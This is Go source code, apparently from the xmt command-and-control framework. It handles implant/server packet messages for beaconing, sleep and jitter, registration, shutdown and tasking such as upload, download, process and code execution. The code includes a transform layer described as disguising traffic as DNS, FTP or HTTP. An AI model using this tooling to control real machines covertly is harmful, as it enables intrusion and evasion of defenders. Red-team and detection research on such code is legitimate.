package c2

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
)

// Packet Message Constants for Handeling and Management.
const (
	MsgPing     = 0xFE00
	MsgSleep    = 0xFE01
	MsgMultiple = 0xFE02
)

// Packet Message Constants for Error Message and Sessions.
const (
	MsgError      = 0xFEEF
	MsgHello      = 0xFA00
	MsgProfile    = 0xFA04
	MsgRegister   = 0xFA01
	MsgShutdown   = 0xFA03
	MsgRegistered = 0xFA02
)

// Packet Message Constants for Tasking and Actions.
const (
	MsgCode     = uint16(task.TaskCode)
	MsgSpawn    = 0xBA04
	MsgProxy    = 0xBA05
	MsgResult   = 0xBB00
	MsgUpload   = uint16(task.TaskUpload)
	MsgRefresh  = uint16(task.TaskRefresh)
	MsgProcess  = uint16(task.TaskProcess)
	MsgDownload = uint16(task.TaskDownload)
)

var (
	buffers = sync.Pool{
		New: func() interface{} {
			return new(data.Chunk)
		},
	}

	wake waker
)

type waker struct{}
type event struct {
	s     *Session
	p     *com.Packet
	j     *Job
	jFunc func(*Job)
	sFunc func(*Session)
	nFunc func(*com.Packet)
	pFunc func(*Session, *com.Packet)
}
type connection struct {
	Mux Mux

	s      *Server
	w      Wrapper
	t      Transform
	ctx    context.Context
	log    logx.Log
	cancel context.CancelFunc
}
type serverClient interface {
	Connect(string) (net.Conn, error)
}
type serverListener interface {
	Listen(string) (net.Listener, error)
}

// Wrapper is an interface that wraps the binary streams into separate stream types. This allows for using
// encryption or compression (or both!).
type Wrapper interface {
	Wrap(io.WriteCloser) (io.WriteCloser, error)
	Unwrap(io.ReadCloser) (io.ReadCloser, error)
}

// Transform is an interface that can modify the data BEFORE it is written or AFTER is read from a Connection.
// Transforms may be used to mask and unmask communications as benign protocols such as DNS, FTP or HTTP.
type Transform interface {
	Read(io.Writer, []byte) error
	Write(io.Writer, []byte) error
}

func returnBuffer(c *data.Chunk) {
	c.Reset()
	buffers.Put(c)
}
func (e *event) process(l logx.Log) {
	defer func(x logx.Log) {
		if err := recover(); err != nil && x != nil {
			x.Error("Server event processing function recovered from a panic: %s!", err)
		}
	}(l)
	switch {
	case e.pFunc != nil && e.p != nil && e.s != nil:
		e.pFunc(e.s, e.p)
	case e.jFunc != nil && e.j != nil:
		e.jFunc(e.j)
	case e.nFunc != nil && e.p != nil:
		e.nFunc(e.p)
	case e.sFunc != nil && e.s != nil:
		e.sFunc(e.s)
	}
	e.p, e.s, e.j = nil, nil, nil
	e.pFunc, e.sFunc, e.jFunc = nil, nil, nil
}
func notify(l *Listener, s *Session, p *com.Packet) error {
	if (l == nil && s == nil) || p == nil || p.Device == nil {
		return nil
	}
	if s != nil && !bytes.Equal(p.Device, s.Device.ID) && p.Flags&com.FlagMultiDevice == 0 {
		if s.swarm != nil && s.swarm.accept(p) {
			return nil
		}
		if p.ID == MsgRegister {
			p.Device = s.Device.ID
		} else {
			return ErrInvalidPacketID
		}
	}
	if l != nil && p.Flags&com.FlagOneshot != 0 {
		if l.Oneshot != nil {
			l.s.events <- event{p: p, nFunc: l.Oneshot}
		} else if l.Receive != nil {
			l.s.events <- event{p: p, pFunc: l.Receive}
		}
		return nil
	}
	if s == nil {
		return nil
	}
	switch p.ID {
	case MsgPing, MsgHello, MsgSleep:
		if p.Flags&com.FlagData == 0 {
			return nil
		}
	}
	switch {
	case p.Flags&com.FlagData != 0 && p.Flags&com.FlagMulti == 0 && p.Flags&com.FlagFrag == 0:
		n := new(com.Packet)
		if err := n.UnmarshalStream(p); err != nil {
			return err
		}
		p.Clear()
		return notify(l, s, n)
	case p.Flags&com.FlagMulti != 0:
		x := p.Flags.Len()
		if x == 0 {
			return ErrInvalidPacketCount
		}
		for i := uint16(0); i < x; i++ {
			n := new(com.Packet)
			if err := n.UnmarshalStream(p); err != nil {
				return err
			}
			notify(l, s, n)
		}
		p.Clear()
		return nil
	case p.Flags&com.FlagFrag != 0 && p.Flags&com.FlagMulti == 0:
		if p.Flags.Len() == 0 {
			return ErrInvalidPacketCount
		}
		if p.Flags.Len() == 1 {
			p.Flags.Clear()
			notify(l, s, p)
			return nil
		}
		var (
			g     = p.Flags.Group()
			c, ok = s.frags[g]
		)
		if !ok {
			c = new(cluster)
			s.frags[g] = c
		}
		if err := c.add(p); err != nil {
			return err
		}
		if n := c.done(); n != nil {
			notify(l, s, n)
			delete(s.frags, g)
		}
		return nil
	}
	notifyClient(l, s, p)
	return nil
}
func notifyClient(l *Listener, s *Session, p *com.Packet) {
	if s != nil {
		switch p.ID {
		case MsgProfile:
			if j, err := p.Uint8(); err == nil && j <= 100 {
				s.jitter = j
			}
			if t, err := p.Uint64(); err == nil && t > 0 {
				s.sleep = time.Duration(t)
			}
			s.log.Debug("[%s] Updated Sleep/Jitter settings from server (%s/%d%%).", s.ID, s.sleep.String(), s.jitter)
			if p.Flags&com.FlagData == 0 {
				return
			}
		case MsgShutdown:
			if s.parent != nil {
				s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
				s.Write(&com.Packet{ID: MsgShutdown, Job: 1})
			} else {
				if s.done > flagOpen {
					return
				}
				s.log.Debug("[%s] Server indicated shutdown, closing Session.", s.ID)
			}
			s.Close()
			return
		case MsgRegister:
			if s.swarm != nil {
				for _, v := range s.swarm.clients {
					v.send <- &com.Packet{ID: MsgRegister, Job: uint16(util.Rand.Uint32())}
				}
			}
			n := &com.Packet{ID: MsgHello, Job: uint16(util.Rand.Uint32())}
			device.Local.MarshalStream(n)
			n.Close()
			s.send <- n
			if len(s.send) == 1 {
				s.Wake()
			}
			if p.Flags&com.FlagData == 0 {
				return
			}
		}
	}
	if l != nil && l.Receive != nil {
		l.s.events <- event{s: s, p: p, pFunc: l.Receive}
	}
	if s == nil {
		return
	}
	if s.Receive != nil {
		l.s.events <- event{s: s, p: p, pFunc: s.Receive}
	}
	if len(s.recv) == cap(s.recv) {
		// Clear the buffer of the last Packet as we don't want to block
		<-s.recv
	}
	s.recv <- p
	switch {
	case s.Mux != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.Mux.Handle}
	case s.parent.Mux != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.parent.Mux.Handle}
	case s.s.Scheduler != nil:
		s.s.events <- event{p: p, s: s, pFunc: s.s.Scheduler.Handle}
	}
}
func readPacket(c io.Reader, w Wrapper, t Transform) (*com.Packet, error) {
	b := buffers.Get().(*data.Chunk)
	if _, err := b.ReadFrom(c); err != nil && err != io.EOF {
		returnBuffer(b)
		return nil, fmt.Errorf("unable to read from stream reader: %w", err)
	}
	if b.Close(); t != nil {
		var (
			i   = buffers.Get().(*data.Chunk)
			err = t.Read(i, b.Payload())
		)
		if returnBuffer(b); err != nil {
			returnBuffer(i)
			return nil, fmt.Errorf("unable to transform reader: %w", err)
		}
		b = i
	}
	var r data.Reader = b
	if w != nil {
		u, err := w.Unwrap(b)
		if err != nil {
			returnBuffer(b)
			return nil, fmt.Errorf("unable to wrap stream reader: %w", err)
		}
		r = data.NewReader(u)
	}
	var (
		p   = new(com.Packet)
		err = p.UnmarshalStream(r)
	)
	if returnBuffer(b); err != nil && err != io.EOF {
		return nil, fmt.Errorf("unable to read from cache reader: %w", err)
	}
	if err := r.Close(); err != nil {
		return nil, fmt.Errorf("unable to close cache reader: %w", err)
	}
	if len(p.Device) == 0 {
		return nil, fmt.Errorf("unable to read from stream: %w", io.ErrNoProgress)
	}
	return p, nil
}
func writePacket(c io.Writer, w Wrapper, t Transform, p *com.Packet) error {
	var (
		b             = buffers.Get().(*data.Chunk)
		s data.Writer = b
	)
	if w != nil {
		x, err := w.Wrap(b)
		if err != nil {
			returnBuffer(b)
			return fmt.Errorf("unable to wrap writer: %w", err)
		}
		s = data.NewWriter(x)
	}
	if err := p.MarshalStream(s); err != nil {
		returnBuffer(b)
		return fmt.Errorf("unable to write to cache writer: %w", err)
	}
	if err := s.Close(); err != nil {
		returnBuffer(b)
		return fmt.Errorf("unable to close cache writer: %w", err)
	}
	if t != nil {
		var (
			i   = buffers.Get().(*data.Chunk)
			err = t.Write(i, b.Payload())
		)
		if returnBuffer(b); err != nil {
			returnBuffer(i)
			return fmt.Errorf("unable to transform writer: %w", err)
		}
		b = i
	}
	_, err := b.WriteTo(c)
	if returnBuffer(b); err != nil {
		return fmt.Errorf("unable to write to stream writer: %w", err)
	}
	return nil
}
func nextPacket(c chan *com.Packet, p *com.Packet, i device.ID) (*com.Packet, *com.Packet, error) {
	if limits.SmallLimit() <= 1 {
		if p != nil {
			return p, nil, nil
		}
		if len(c) > 0 {
			return <-c, nil, nil
		}
		return nil, nil, nil
	}
	var (
		t, s int
		m, a bool
		x, w *com.Packet
	)
	for t < limits.SmallLimit() {
		if p == nil {
			if len(c) == 0 {
				if t == 1 && a && !m {
					return x, nil, nil
				}
				break
			}
			p = <-c
		}
		if p.Verify(i) {
			a = true
		} else {
			m = true
		}
		if s += p.Size(); s >= limits.FragLimit() {
			if a && !m && t == 0 {
				return p, x, nil
			}
			if a && !m && t == 1 {
				return x, p, nil
			}
			if w != nil {
				break
			}
		}
		if t++; t == 1 && !m && a {
			x, p = p, nil
			continue
		}
		if w == nil {
			w = &com.Packet{ID: MsgMultiple, Device: i, Flags: com.FlagMulti}
			if x != nil {
				w.Tags, x.Tags = x.Tags, nil
				if x.MarshalStream(w); x.Flags&com.FlagChannel != 0 {
					w.Flags |= com.FlagChannel
				}
				x.Clear()
				x = nil
			}
		}
		w.Tags, p.Tags = append(w.Tags, p.Tags...), nil
		if p.MarshalStream(w); p.Flags&com.FlagChannel != 0 {
			w.Flags |= com.FlagChannel
		}
		p.Clear()
		p = nil
	}
	if !a {
		m, t = true, t+1
		(&com.Packet{ID: MsgPing, Device: i}).MarshalStream(w)
	}
	if w.Close(); m {
		w.Flags |= com.FlagMultiDevice
	}
	w.Flags.SetLen(uint16(t))
	return w, x, nil
}
